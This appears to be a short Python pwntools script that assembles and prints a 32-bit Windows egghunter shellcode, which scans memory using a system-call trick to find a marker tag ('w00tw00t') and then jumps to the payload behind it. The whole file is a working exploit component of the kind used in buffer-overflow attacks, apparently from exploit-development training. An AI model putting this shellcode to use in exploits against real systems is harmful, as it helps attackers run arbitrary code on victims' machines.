#!/usr/bin/env python3

from pwn import *

shellcode = asm('''
loop_inc_page:
    or dx, 0x0fff
loop_inc_one:
    inc edx
loop_check:
    push edx
    push 0x2
    pop eax
    int 0x2e
    cmp al, 0x5
    pop edx
loop_check_valid:
    je loop_inc_page
is_egg:
    mov eax, 0x74303077
    mov edi, edx
    scasd
    jnz loop_inc_one
    scasd
    jnz loop_inc_one
matched:
    jmp edi
''')

print(disasm(shellcode))
print(f'egghunter = {shellcode}')
